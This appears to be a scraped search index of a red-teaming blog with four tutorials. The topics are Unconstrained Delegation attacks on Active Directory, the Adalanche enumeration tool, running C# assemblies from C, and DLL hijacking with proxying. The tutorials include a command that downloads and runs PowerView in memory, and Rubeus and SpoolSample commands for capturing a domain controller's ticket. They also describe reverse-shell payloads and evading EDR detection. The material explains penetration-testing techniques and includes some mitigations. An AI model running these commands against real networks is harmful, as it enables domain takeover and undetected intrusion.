[[{"l":"Welcome"},{"l":"Red Teaming Army","p":["This is my personal blog space. The main idea of this platform is to allow me to share my knowledge in Red Teaming and Penetration Testing. Feel free to use the file navigation in order to view the present blogposts, or use the recursive search to find something specific of your needs!","I will do my best to transfer all of my videos to blogposts in order to reach more people.","The Red Teaming Army has its Discord server available here: https://discord.gg/bgSpdheEgu","Feel free to join the Discord server, where we share knowledge and experience, while debugging problems in real time!"]},{"l":"Support","p":["All of my work on this blog space is and always will be free and publicly accessible.","If you have further appreciation for my work, you can become my Patreon ( https://www.patreon.com/Lsecqt) and get access to custom tools, private notes and Know-How, and the ability to request videos or blogs on specific topic.","Or you can just buy me a coffee ( https://www.buymeacoffee.com/lsecqt)"]}],[{"l":"Unleashing the Power of Unconstrained Delegation"},{"l":"Introduction","p":["In the world of Active Directory, a lot of attacks are based on delegation misconfigurations. Depending on the context, they may allow the attacker to laterally move across the network, achieve local / domain privilege escalation or even compromise the Domain Controller (DC).","In this blog we are diving into Unconstrained Delegation.","If you prefer watching a video instead of reading, you can find my video walkthrough on the topic here: Attacking Active Directory: Unleashing the Power of Unconstrained Delegation (youtube.com)","Do not forget to join the Red Teaming Army's Discord server where we share knowledge, experience, and debug together in real time: https://discord.gg/bgSpdheEgu","Also, if you have further appreciation for my work you can become my Patreon: Lsecqt | Creating Pentesting / Red Teaming Videos | Patreon. This helps me a lot."]},{"l":"Theory"},{"i":"what-is-delegation","l":"What is Delegation?","p":["In a nutshell, delegation is the act of granting specific user / machine / service elevated rights towards other user / machine / service. Usually such privileges are granted on computers that run various services, like MSSQL / IIS or on users with bigger administrative needs.","To better understand it, let's take the following example: A user is authenticating and operating to IIS service which is connected to a MSSQL database. When the DB backend needs to be modified the IIS server connects to it on behalf of the user, thus, the IIS service or perhaps the whole machine could be entrusted for delegation.","Another example would be to entrust sysadmins or HelpDesk users to perform operational roles (create, manage and delete) for other domain users. In this case, specific tasks in the context of the Active Directory would be delegated to specific group of people."]},{"i":"what-is-unconstrained-delegation","l":"What is Unconstrained Delegation?","p":["Normally, the delegations across the Active Directory should be strictly configured. It should explicitly map the delegated user / machine to the specific services and nothing more.","Unconstrained Delegation also known as Unrestricted Delegation is characterized with that it is NOT limited to specific service, but instead it impersonates the designed user / machine with all of its access rights and permissions across the AD context. Unrestricted Delegation is designed to save the delegated user's TGT directly into the computer's memory.","For instance, if we take the previous User -> ISS -> MSSQL example, if the same scenario was replicated with configured Unconstrained Delegation, the IIS service would obtain a valid TGT for the user connecting to it.","Any authentication towards Unconstrained Delegated machine, will effectively save the incoming user's TGT into the memory of the machine. This behavior also makes UD marked machines nice targets, since they may contain a lot of valid user's TGTs."]},{"l":"Exploitation"},{"l":"Enumeration","p":["The easiest ways to enumerate Unconstrained Delegation are via:","PowerView ( https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)","BloodHound ( https://github.com/BloodHoundAD/BloodHound)"]},{"l":"PowerView","p":["PowerView is powerfull tool designed for Active Directory enumeration. It has built-in modules for analyzing delegation permissions across domain users and machine accounts.","To find Unconstrained Delegation entities, it is enough to:","Import it","iex(new-object net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')","Scan for Unconstrained Delegation:","Get-DomainComputer -Unconstrained","Finding machines marked for Unconstrained Delegation","The following output reveals 2 machines that have Unrestricted Delegation enabled. This means:","Any user connecting via any service on any of the mentioned machines will have his TGT saved inside the memory of the corresponding machine.","Since both of them are marked as Unrestricted Delegation, if you have access to one of them, you could most likely laterally move to any other machine if you can coerce its authentication.","Since the TGT is automatically saved to the targeted computer via any form of authentication, we can capture the TGT for the Domain Controller by performing authentication coercion."]},{"l":"BloodHound","p":["It is also possible to find computer accounts marked for Unconstrained Delegation via BloodHound. I am not going to dive deep into how BloodHound operates, but in a nutshell:","When you import the collected data from the Active Directory into BloodHound, you can use the following option for finding accounts allowed for Unconstrained Delegation:","Finding machines marked for Unconstrained Delegation with BloodHound","By default, Unconstrained Delegation is assigned to machine accounts, but in some edged cases, you may enumerate the same delegation rights to be present on specific user accounts."]},{"i":"exploitation-1","l":"Exploitation","p":[".\\Rubeus.exe monitor /interval:10 /filteruser:dc01$",".\\SpoolSample.exe dc01 client01",".\\SpoolSample.exe Target_Server Capture_Server","Armed with the ticket we can compromise the Domain Controller or directly perform DCSync.","As mentioned before, in its core, when machine is marked for Unconstrained Delegation, any user / machine authenticating to it, via any service, will result in its TGT stored on the authentication machine.","Capturing TGT from the Domain Controller's machine account","Coercion can be triggered via various tools such as Coercer or Petitpotam, do not limit yourself with anything specific! Different tools will work in different cases.","Confirming that the dc01$ ticket is imported","For instance, in this example, we have already compromised $Client01 machine and our target is $DC01.","If we compromise a machine marked for UD, and if we somehow force authentication from other machines / users across the network, we could effectively compromise them.","In this example, we will perform coercion via SpoolSample to trigger the authentication.","Keep in mind that it is super common to encounter Unconstrained Delegation flag on Domain Controllers, since this is part of their operational work and they are by default trusted! Even if they are missing the flag, they can still be compromised if authentication coercion is possible and the compromised machine has the flag enabled!","Keep in mind that since our compromised machine Client01$ is marked for Unconstrained Delegation, by not filtering the tickets account, you can get overwhelmed. Not filtering can be extremely useful in different scenarios, but now the target is DC01$","klist","Let's start Rubeus in monitor mode:","Now if we go back and check the Rubeus process, we can observer that the TGT from the Domain Controller's machine account was successfully dumped and injected.","Rubeus has monitor mode support, which means it can effectively listen for incoming authentication and will automatically retrieve the TGT if it is stored!","Starting Rubeus in monitor mode","The next step is to either wait for any form of authentication or force it! This may vary depending from your context and objectives, for example, phishing attacks for SMB path spoofing can be implemented, tricking users to connect to the Unconstrained machines.","The syntax is fairly simple:","This command will also filter the results based on its originating account. In this case, to have a clean output, we are interested in the Domain Controller's machine account DC01$","Triggering the authentication from the DC to our capture server via SpoolSample","We can confirm that the ticket is injected by running:","Which will get translated to:","While there are various ways of executing this attack, I prefer doing it with Rubeus."]},{"l":"Conclusion","p":["Again we are faced against the calculation between scalability and security. Of course it is easier to just setup things to be relevant to all services, but this can come with huge risk. Let’s discuss how to mitigate it!","First of all is disabling Print Spooler service, especially if you do not need it! By disabling coercion you can reduce the risk and the chance for this attack. However, as mentioned before, this is not the only way of executing it, thus, by removing coercion misconfigurations, you can still get pwned!","Important note: Print Spooler is just one service / interface that can trigger authentication, there are many, many more ways to do coercion attacks. It is recommended to disable them all, unless you have practical use for them.","While this remediation technique is doing well, my most honest recommendation is to be careful when setting things up. Try to encapsulate as much as you can, this way you make the attacker’s job harder by adding hours and hours into researching in order to try more things.","Make sure to setup delegation permissions only for specific user / machine accounts and make sure they are pointing only to specific service, user or machine account. Avoid using Unrestricted Delegation, especially on machines that are not Domain Controllers.","Delegations are elegant way of optimizing the internal network mechanisms, but should be implemented with caution. Make sure to implement delegation for and to the exact assets that needs the delegation at the first place.","Hope you enjoyed and learned something new!"]}],[{"l":"Visualizing ACLs with Adalanche"},{"l":"Visualizing ACLs with Adalanche","p":["I was always a fan of trying new tools in order to create a personal arsenal for edged cases. Recently, I found a tool called Adalanche, which is capable of enumerating and visualizing ACLs between entities in the scope of the Active Directory.","Usually, Active Directory misconfigurations can be found within the ACLs, and they can often lead to obtaining domain administrative privileges by chaining various lateral movement or privilege escalation techniques together. A very simple example for that can be a vulnerable ADCS server to ESC1 attack. Another example could be finding out that the current owned user is local administrator on some machine and after data exfiltration, you find domain admin credentials.","Mapping such attack vectors can be complicated without such tools, and while you should not be dependant of them, they are here to help, and they certainly do!","While BloodHound is my rank #1 tool for enumerating and visualizing the Active Directory, I was also thrilled to try Adalanche, mainly because of curiosity in terms of UI, practical use and evasiveness. Turned out that this tool might be a hidden gem!","If you prefer watching a video instead of reading, I already deployed a video about the topic on my channel:","Also make sure to join my Discord where we share experience, knowledge and doing CTF together.","And if you have further appreciation for my work, don't hesitate to become my Patreon!"]},{"i":"why-not-just-use-bloodhound","l":"Why not just use BloodHound?","p":["Now here comes the question, why bother with Adalanche when I have BloodHound?","The answer is very simple, it is always a good idea to have alternatives for specific tools. Also, alternatives creates competition and this is a fundamental process of improving both of the sides, so its a win = win situation.","Additionally, as you might already know, SharpHound(The data collector for BloodHound) is extremely signatured by various security mechanisms. I am aware that the signatures and the behavioral detections can be bypassed but sometimes its not a trivial process. For Instance, it is possible to land into an environment that is extremely well network segmented, so that you cannot get a C2 implant to run and you should rely on some kind of workarounds such as bind shells on specific ports, which not all C2 framework actually supports. Additionally, its possible that the network is restricted in such way, that you cannot just execute the python collector. On top of that, if the segmentation is combined with enforced endpoint protection, it can become even more challenging. This just makes the things more complicated and can effectively lose a day or two into just getting the basic AD enumeration.","On the other hand, Adalanche is a tool that can work as both a collector and a visualizer at the same time, while it is extremely evasive. Imagining the previous restricted scenario, if Adalanche is execute from a compromised machine with network access to the LDAP server, it is less likely to get detected and blocked.","When operating from C2 framework, the Adalanche binary can be executed with any PE-execution module, if your C2 supports such!","[BIG DISCLAIMER] I am aware that there are always various workarounds for all scenarios. The goal of this blog is not to question them, but to discuss and analyze the Adalanche tool.","Now, let's get an idea of what Adalanche actually looks like."]},{"l":"Adalanche Overview","p":["Adalanche is go-written tool for collecting and analyzing data from Active Directory. It is capable of extracting potential attack vectors such as unconstrained delegation, ESC1, outdated servers, users with administrative privileges and more. It is extremely fast and compatible with each modern Operating System (OS).","One of the coolest features about Adalanche is that it is self-sufficient, which means, you do not need:","Database (like Neo4j)","Specific engine or runtime installed (like dotnet runtime)","Additional software (like a web server)","All you need is the compiled binary and luck that you are in a vulnerable environment. Since the Adalanche is go-written, the same code can be compiled for both windows and * nix systems.","It is always a good idea to obfuscate the code and compile it yourself. Currently (January, 2024) the tool does not get signatured but most likely this will change in the near future!","Adalanche can be run directly, with no arguments if it is launched from a domain joined windows machine. On the other hand it can also mimic bloodhound.py, scraping the LDAP from a machine with network access to the Domain Controller. It then stores the gathered data into a folder called data, which can be analyzed in the future. Now let's analyze the different methods on how to get it running!"]},{"i":"case-1-i-am-operating-from-a-domain-joined-windows-computer","l":"Case 1: I am operating from a domain joined Windows computer","p":["Adalanche is capable of detecting the context of the current user. In case you are operating from a domain joined machine, and from the context of a domain user, you do not need to supply any arguments! In this scenario it is enough to just download and execute the binary.","This will perform all the scraping automatically, then Adalanche will automatically analyze the collected data and finally, it will host the results on 127.0.0.1:8080 while navigating your default browser to the web view.","If everything went smooth, you should see something like this:","Entry screen of adalanche"]},{"i":"case-2-i-am-operating-from-a-host-with-vpn-access-and-ad-credentials","l":"Case 2: I am operating from a host with VPN access and AD credentials","p":["Adalanche is also capable of scanning and extracting data from the Active Directory remotely. In this scenario, it is required to have network visibility to the LDAP servers as well as a valid pair of credentials for the Active Directory.","The Adalanche binary can now be used in 2 modes:","collect","analyze","The first mode will perform the data collection via querying the LDAP service. After completion, again, all of the results will be stored in a folder called data unless you specify something different. All of the needed options can be found on the docs or by running:","By following the options, this exemplary command can collect the data from the Active Directory:","After this command finishes, the data folder will be present in your current working directory.","Since all of the collected AD information is stored into that data folder, you can also zip and ship it somewhere else. Keep in mind that the dump can be analyzed offline as soon as the Adalanche binary is present. As already mentioned, the same binary can be used for both collection and analyzing the data.","When you are ready to analyze the results and generate a web view, you can do so by running:","If everything is running as expected, you should again see the initial screen of Adalanche: Entry screen of adalanche"]},{"l":"Adalanche Usage","p":["Adalanche comes with the following predefined LDAP queries for visualizing nodes and searching for attack paths:","Adalanche UI is divided into 3 parts:","Adalanche visual options","Additionally, the options Set as route target and Route to target can be used to effectively display the attack path:","Additionally, the orange links most of the times mean that the object is a member of specific group, while the white usually means that there is some form of connection between objects which is not dangerous or exploitable.","Additionally, the Start Query, Middle Query and End Query are query separators, which means, that you can implement your own custom nested queries for finding various attack paths, misconfigurations and vulnerabilities.","Ann Rogers has AllExtendedRights permissions over SQL02 machine","Builtin LDAP queries","By following the same logic, we can understand that the SQL02 is marked for Unconstrained Delegation, because its node is bigger and marked in red, compared to other machine accounts in the graph:","Compared to BloodHound, Adalanche is not using any database engines for storing the results. It is based entirely on LDAP to perform any visualization and analysis over the collected data (which is purely stored on the local file system). To visualize the results, Adalanche uses web view, which can be configured with the option --bind 'IP:PORT'.","Cons","Exact query match in red, in this case SQL02 is allowed for Unconstrained Delegation","Extremely easy to lose the data","Extremely easy to migrate and share","From these, you may notice that a lot of the queries are actually familiar from BloodHound (such as Kerberoastable users, DC Sync users and so on).","However, various objects can effectively influence and control emma: Results from Who can pwn this node? query","In this scenario, our user emma does not have direct dangerous and abusable ACLs toward any object in the domain. Results from What can this node pwn? query","It is in the LDAP querying tool where it gets interesting.","LDAP query section","LDAP querying tool centered on the bottom.","Lets analyze the above executed query: ((type=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!userAccountControl:1.2.840.113556.1.4.803:=8192)) which is designed to show all computers which are marked for Unconstrained Delegation, and are not Domain Controllers. While at first the output can be a little messy, it makes sense when you start reading the lines.","No collector / db engine version incompatibility","No dependencies other then the Adalanche binary","No Internet Explorer support, wont run smooth on old machines","Nodes visualization settings on the right","Object explorer","Object explorer on the left","Of course, one negative aspect would be that you need to be doing good with LDAP in order to implement anything custom and to get the most out of Adalanche, but on the other hand, I found out that the default queries are working pretty nice. While I find the output from some of them confusing, others like Who can change GPOs, ESC1 vulnerable certificate templates and Who can dump SAM/SYSTEM can be extremely easy to understand and useful.","On the Object explorer you can observe and analyze various objects, including present users, their groups, machines, Active Directory configurations and more.","On the right, you can tweak how the Adalanche should look like, but I personally did not spend much time on it since I was happy with the defaults.","One of the coolest parts about Adalanche, is that when you execute one of the queries, you get its raw syntax inside the LDAP querying section, from where you can modify and update the query to suit your needs.","Other features such as what can this node pwn and what can pwn this node I found to be extremely useful and practical. These options can be utilized into setting up a target or a starting point.","Pros","Query showing Unconstrained Delegation non-DC machines","Querying the user emma, visualizing all objects that can directly influence her.","Results from setting emma as a target and running Route to target from Enterprise Admins group node","Similar to BloodHound, when you click on the paths between objects, you can get additional details about various attributes and relationships. It is not as informative as BloodHound(the path does not give exploitation guides), but still can be quite useful when you are already aware of the most common AD attacks. For example, when you see a red link between nodes, Adalanche claims that there are dangerous permissions between them.","Storing files on the local FS can lead to super easy signatures","The data from the object explorer is the raw data from the LDAP server. Here you can find the values in various object fields, such as object description","The whole idea of these options is to find attack paths to or from specific objects.","This behavior has its pros and cons such as :","User admin is a member of the Administrators group, visualized with orange link","With that, Adalanche has everything needed to find misconfigurations and vulnerabilities in the scope of the Active Directory. I know that there are a lot of features that are missing, compared to BloodHound, but still the essentials are here. One of the features I think Adalanche is lacking, is the exploitation docs on the node paths. Additionally, I found Adalanche hard to navigate and analyze specific single objects. Compared to BloodHound, where you can just type the object into the search box, here you would need to use LDAP queries. For example, in order to find a specific user, you can use the following LDAP query: ((objectCategory=person)(objectClass=user)(sAMAccountName=username))"]},{"l":"Conclusion","p":["Now it is your turn to try out the tool and decide for yourself if it is worth it or not! In my opinion, compared to BloodHound, Adalanche is worst at visuals but still can present useful information and real attack paths.","While it can be initially confusing I think it is a great alternative which has its own pros and cons. I personally find the architecture pretty amazing and well done! The ability to be that flexible and evasive is something that must be credited, and we also need to acknowledge that the project is actively being developed and supported!","Metadefender scan results","I highly encourage you to try it out on your own and decide whether it is useful in your cases."]}],[{"l":"Executing CSharp Assemblies from C code"},{"l":"Introduction","p":["The integration of native C code with managed C# assemblies opens up a realm of possibilities, allowing malware developers to leverage the strengths of both worlds within a single application. Most of the modern C2 frameworks have the option for executing C# assemblies, no matter on which language they are built upon. I know it is a feature we all desire but have you ever wondered, how it works on the bottom level? How it is possible to invoke an assembly from a language like C?","At its core is the Common Language Runtime (CLR), a vital component of the .NET framework.","The magic begins with the compilation process. The native C code is typically compiled into machine code specific to the target architecture, while the C# code is compiled into an intermediate language called Common Intermediate Language (CIL). This intermediate language serves as a bridge between different languages and platforms.","During runtime, when your application is in action, the CLR comes into play. It takes the CIL from the managed C# assemblies and Just-In-Time (JIT) compiles it into machine code that can be executed by the underlying hardware. This JIT compilation ensures that the C# code is optimized for the specific environment it's running on.","Before diving deeper into this topic, make sure to join my Discord where we share experience, knowledge and doing CTF together.","If you have further appreciation for my work, don't hesitate to become my Patreon!"]},{"i":"what-is-clr","l":"What is CLR?","p":["The Common Language Runtime (CLR) stands as a foundational element within the Microsoft .NET framework, playing a crucial role in the execution of .NET applications. It creates a versatile runtime environment, allowing developers to code in various languages such as C#, VB.NET, and F#. This multilingual support is made possible by compiling code into a common intermediate language (CIL or IL), which CLR then translates into native machine code during runtime.","One of CLR's notable features is its management of memory. It ensures efficient memory allocation and deallocation, mitigating the risk of memory leaks and enhancing overall program reliability.","CLR also incorporates Just-In-Time Compilation (JIT), dynamically compiling IL code into native machine code at runtime. This adaptive process optimizes performance by tailoring the code to the specific characteristics of the underlying hardware.","The Common Language Runtime (CLR) is an integral part of the Windows operating system, making it available by default. This inclusion in the Windows environment streamlines the development process for .NET applications, as developers can leverage CLR's features without the need for additional installations.","The .net runtime version that comes by default with Windows 10 OS is v4.0.30319"]},{"i":"loading-assemblies-from-c","l":"Loading Assemblies from C#","p":["Loading assemblies from C# is a trivial process mainly because the CLR is already present in the memory of the parent process. The most easy way to load C# assembly from another C# program is by using Assembly.Load method.","The Assembly.Load method is part of the System.Reflection namespace and allows you to load an assembly by providing its name or path. There are a few overloads of this method, but a common one takes a string parameter representing the name of the assembly to load.","The assemblyString parameter can be the full name of the assembly, which includes the assembly's simple name, version, culture, and public key token.","Another key component we need to discuss is AppDomain. In C#, an AppDomain(Application Domain) is a lightweight, isolated, and self-contained environment within a process where .NET applications run. It provides a way to isolate and unload applications independently within a single process. By default, each C# application operates under at least 1 AppDomain. In most cases, for simple applications, you don't explicitly interact with the default AppDomain because it is automatically created for you. However, in more complex scenarios or when dealing with advanced features like application domain isolation and unloading, you might create additional AppDomains.","Let's say you have a scenario where the assembly name is known and it is in the same working directory as the custom loader below. Here is basic example of loading Rubeus, which is in the same directory.","After compilation and execution, we can indeed observe that the Rubeus.exe is executed.","Executing Rubeus from custom C# application","Additionally, if we observe the process with ProcessHacker2, the Rubeus.exe will be present in the loaded modules:"]},{"l":"Loading Assemblies with C"},{"i":"what-is-the-problem","l":"What is the problem?","p":["While loading and executing assemblies is easy in C#, we should not be dependant of the language and its pros and cons.","Executing C# assemblies with C can be a bit tricky due to the differences in how these languages work and the runtime environments they rely on.","Firstly, C# is designed to run on the .NET framework, which provides a managed runtime environment. This means that C# code is compiled into an intermediate language (IL) that is executed by the Common Language Runtime (CLR). On the other hand, C is a low-level language that doesn't have built-in support for the features provided by the .NET framework.","One major challenge is that C doesn't have a built-in understanding of the .NET runtime and its features, such as garbage collection, type safety, and reflection. C# relies heavily on these features for its execution, and trying to replicate them in C can be quite complex and error-prone.","Additionally, C# assemblies are typically packaged with metadata and other information that the CLR uses for execution. Replicating this functionality in C would require a deep understanding of the .NET runtime internals, which is a complex task.","Another issue is that C# code often relies on libraries and dependencies that are part of the .NET framework. These libraries may not have direct equivalents in C, making it challenging to provide the same functionality."]},{"i":"the-solution","l":"The Solution?","p":["After executing the code against the modified Rubeus.exe, we can confirm that it is successfully executed.","Another approach would be to implement a loader or a packer that in runtime forwards the execution to the desired assembly / method.","Asktgt module invoked from successfully passing the arguments","Executing C# assemblies from C involves a process called hosting. The idea is to create a host application in C that loads the CLR and runs the C# assembly.","Having confirmed compatibility and loadability, the code fetches the ICLRRuntimeHost interface, enabling direct interaction with the CLR runtime.","Having that in mind, if you want to execute a C# assembly like Rubeus, one of the options can be adding such method that will forward the execution flow to the Main method.","Here, paths and names are specified for the C# assembly, type, method, and parameters.","However, even though its possible to invoke C# assemblies from C-like languages, there is a specific limitation. As mentioned before, each and every C# application operates under at least 1 AppDomain which is created and present by default. In order for our C program to execute an assembly, the AppDomain must be explicitly accessed, since its not there by default. After accessing the AppDomain, we face another limitation. In order for a method to get called from ExecuteInDefaultAppDomain, it must inherit the following signature:","In the preamble, necessary headers are included. mscoree.h, windows.h, metahost.h, and corerror.h provide declarations and definitions required for interacting with the Common Language Runtime (CLR) and handling errors. Additionally, #pragma comment(lib, mscoree.lib) directs the linker to include the mscoree.lib library, essential for linking against the CLR.","Lets analyze the code more in depth:","Once the CLR is hosted, the next step is loading the C# assembly. Functions like Assembly.Load or Assembly.LoadFrom facilitate this process, allowing the C program to bring the compiled C# code into the CLR environment. The CLR's just-in-time compilation then translates the Intermediate Language (IL) code into native machine code. Loading the CLR empowers the C program to interact with the C# code flexibly, adapting to the dynamic nature of the managed environment.","The cleanup phase involves stopping the CLR runtime and releasing the acquired resources in the reverse order of acquisition.","The code queries the MetaHost for information about the desired CLR version (\"v4.0.30319\"). This version is a nice choice since it is shipped by default in each Windows 10. The obtained ICLRRuntimeInfo interface is stored in pRuntimeInfo. If unsuccessful, the previously acquired resources are released, and the program exits with an error code.","The ExecuteInDefaultAppDomain method triggers the execution of the specified C# assembly within the default application domain. The result is stored in dwRet. If successful (result code is S_OK), \"OKAY\" is printed to the console just for a dummy result check syntax.","The following POC can be used to seamlessly execute C# assemblies, as soon as they have a method with the above signature:","The IsLoadable method checks if the specified runtime version is loadable. If not, resources are released, and the program exits with an error code.","The main function serves as the entry point of the program. Here, we declare pointers to the ICLRMetaHost, ICLRRuntimeInfo, and ICLRRuntimeHost interfaces, which are crucial for CLR interaction.","The Start method initiates the CLR runtime within the current process.","The type of the assembly does not matter, if the method signature is present, both .exe and .dll can be executed with the same technique on the POC code.","This involves initializing the CLR using functions such as CorBindToRuntimeEx or CLRCreateInstance. The CLR becomes the bridge, providing the necessary runtime environment for managed C# code.","This line initializes the CLR MetaHost by calling CLRCreateInstance with the CLSID_CLRMetaHost identifier and obtaining the ICLRMetaHost interface. If the operation fails, the program exits with an error code."]},{"l":"Conclusion","p":["While this code is far from practical and advanced, I believe it can still give you an idea of what is the process of executing assemblies from a low level language like C.","I believe that having the ability to be flexible on the programming languages is a crucial skill for every malware developer. Being able to trigger or execute managed code from any environment can help you with both enumeration and exploitation during engagements.","I am not aware of how other low level languages are treating the CLR, but my bet is that it always has to be explicitly loaded.","Thank you so much for you time, and I hope you learned something new!"]}],[{"l":"Weaponizing DLL Hijacking via DLL Proxying"},{"l":"Introduction","p":["Dynamic Link Library (DLL) is a collection of code that can be shared across multiple processes in Windows. A process imports a DLL when it needs to use functions or resources externally provided by it. For example, if a message box is displayed, the User32.dll would be imported to the running process.","DLL Hijacking is an attack, in which the intruder overwrites a specific and predefined DLL on the remote file system. When a process loads the overwritten library, a malicious code will be executed instead of the real one.","While DLL Hijacking is usually exploited for persistence, privilege escalation and lateral movement, it is a great technique for initial access, since it de-chains the download from the execution phase, which is highly suspicious behavior for EDRs (Endpoint Detection and Response).","A nice webinar on EDR evasion with DLL Hijacking can be found here: https://www.youtube.com/watch?v=CKfjLnEMfvI"]},{"l":"Theory","p":["The process of loading DLLs is automatically handled by the Windows OS. To demonstrate it let's take the following C code:","When executed, a message box will appear. If we inspect the program with Process Hacker 2 we can confirm that the user32.dll module is indeed loaded into the process.","user32.dll viewed from Process Hacker","If you replace one of the loaded DLL with a malicious one, the next time a process loads it, the malicious code inside will get executed. This is DLL Hijacking.","By default, in Windows OS, when an application loads dynamic link libraries (DLLs), the operating system follows a specific search order to locate these DLLs. The search order is prioritized as:","The directory from which the application is loaded: The system looks for DLLs in the same directory as the executable file of the application.","The current working directory: If the DLL is not found in the application's directory, the system searches the current working directory. However, be cautious with relying on the current working directory, as it can change during the execution of the program.","Windows System directories: If the DLL is not found in the application's directory or the current working directory, the system searches the directories listed in the system's PATH environment variable. This includes standard system directories like C:\\Windows\\System32.","Windows directories: If the DLL is not found in the aforementioned locations, the system searches the Windows directory.","Directories listed in the PATH environment variable: If the DLL is not found in any of the previous locations, the system searches the directories listed in the PATH environment variable.","This search priority is often abused for DLL Hijacking attacks, since a lot of applications will initially request a DLL from a folder where the user has write access rights over.","When developing an application, it is important to use full paths for the needed modules in order to avoid hijacking vulnerabilities."]},{"l":"Classical DLL Hijacking","p":["By \"Classical DLL Hijacking\" I mean the exploitation of DLL Hijacking vulnerability just for demonstrative purposes (a.k.a not caring about evasion, you just want to prove that the application is vulnerable).","During this blogpost I am using DVTA for my testing environment.","Finding a DLL Hijacking vulnerability is as simple as scanning different processes for their module imports, and overwriting a module if you have write access to the path on the filesystem where it is missing or loaded.","This behavior can be easily analyzed with tools like Process Monitor. If you specify the following filters, ProcMon will scan the defined process for all DLL imports.","Filtering DVTA process and all DLL imports","After the filters are applied it is recommended to restart the application for maximum coverage. Eventually, after watching the process activity you should come up to something like this:","DVTA cannot find C:\\Users\\lsec\\Desktop\\DVTA\\DVTA\\bin\\Release\\profapi.dll","This is a perfect candidate for DLL Hijacking attack, since the DVTA application is trying to load profapi.dll within my user's folder.","For generating a sample DLL, we can use either custom made one (recommended), or a msfvenom one. For the sake of the demo, I created the following custom DLL, to spawn \"calc.exe\" process.","DLL's entry point is called \"DLLMain\" and it executes code via various conditions on how the DLL is being called. When a process reads a function from the DLL it generally uses \"DLL_PROCESS_ATTACH\". We will store our custom code there! While this sample POC is designed to just spawn calc.exe, in real scenario you want your payload execution logic here!","The same behavior can be replicated with msfvenom:","After the DLL is generated, it is enough to just transfer it over the directory from where the application is trying to load it, and it is done. When the application is restarted and the DLL is re-imported, the payload behind will get executed.","Spawning calc.exe after placing profapi.dll and restarting the application","During the \"Classical DLL Hijacking\" attack, the targeted application will most likely stop working after the custom DLL is executed! This is because the application requires specific functions from the imported DLL and our custom one is lacking them."]},{"l":"DLL Proxying","p":["Additionally, the payload execution should not be handled poorly, if the payload execution thread corrupts the process, even though the exported functions are present, the application could still timeout.","After combining the pieces I created the following POC:","After executing the command, make sure to restart the targeted binary, and then terminate Spartacus by pressing enter. When stopped, it will generate similar output: Spartacus automatically using ProcMon to filter Hijackable DLLs","After performing DLL Hijacking with the compiled DLL, the binary executes as normal, while the shell callback is present. Application is running as expected","AV / EDR Evasion","DLL Proxying is when you embed the exported functions from the original DLL into your malicious one. This way when the DLL is hijacked and loaded, the malicious payload will get executed in parallel with the intended and needed exported functions.","From the output, Spartacus founds which DLLs are hijackable and forwardable, exported their functions and generated a C++ template for the DLLs.","I already have a video on DLL Proxying, so if you prefer watching instead of reading, feel welcomed to my channel:","In a DLL, an exported function is a function that is made available for other applications or DLLs to use. When a function is exported, it means that it is exposed and can be called by external programs. Exported functions could serve as entry points for other software components to utilize the functionality provided by the DLL.","In this example it is clear that the previously exploited profapi.dll is not a good match, since Spartacus cannot export its functions. However, CRYPTSP.dll looks like a better option.","No matter in which scenario the DLL Hijacking is needed, it is important to not break the application / environment of the victim. No matter how evasive your payloads are, if the client software is corrupted, it could easily lead to internal escalation.","Now let's tweek the malicious template from Spartacus! I created Offensive CPP repository, its idea is to host offensive C/C++ independent snippets, which can be used in various scenarios. Let's copy some shellcode execution code. During the demo, I am using the FileMap snippet.","Persistence","Privilege Escalation","Receiving the reverse shell","Since the \"Classical DLL Hijacking\" is super simple to perform, it is also extremely ineffective in real engagements. In order to weaponize this attack, it is important to understand \"why\".","Spartacus requires ProcMon to be installed.","Spartacus will automatically engage with ProcMon, setup filters and find DLL hijackable binaries. After finding such, it will try to export all the functions it needs from the mentioned DLL.","The application block is generally caused by 2 factors:","The C++ template for CRYPTSP.dll looks like this in my example:","The last step is to generate a shellcode from msfvenom:","The malicious DLL is missing the functions that are needed from the application.","The payload is hijacking the thread, which can result in a timeout.","To run Spartacus, you can follow the syntax:","To solve this problem we must perform something called DLL proxying. It looks like this: https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistenceDLL","Typically, the DLL Hijacking attacks are utilized for:","While each one of these topics are super complex and requires a lot of dedicated attention, we will not dive into them today. In this blog we will focus on how to weaponize the DLL Hijacking attack, so that it does not break the application runtime after the payload is executed. I am going to release more blogs on these topics in future! Stay tuned!","While this approach may sound super complex, there are tools that can export all the needed functions in C/C++ template. One such tool is called Spartacus."]},{"l":"Conclusion","p":["As mentioned before, DLL Hijacking on its own is a valid finding and often during pentests, it can be enough just to prove that the targeted application is vulnerable. However, in more complex cases, you may need to operate more stealthy.","Since the \"Classical DLL Hijacking\" is corrupting the workflow of the targeted application, this can be a huge IOC (Indicator Of Compromise). To evade being detected, before implementing any custom evasive payloads, you have to make sure that your techniques do not disrupt anyone's environment. While DLL Proxying may sound more complicated and requires additional programming skills, it is a nice way to weaponize the DLL Hijacking attack.","More on AV / EDR evasion blogs are yet to come!","Thank you for your attention, I really hope this blog was useful, if so, you can support me on:","Patreon","BuyMeACoffee","Youtube","Twitter","Github","Also make sure to join the Red Teaming Army Discord channel."]}]]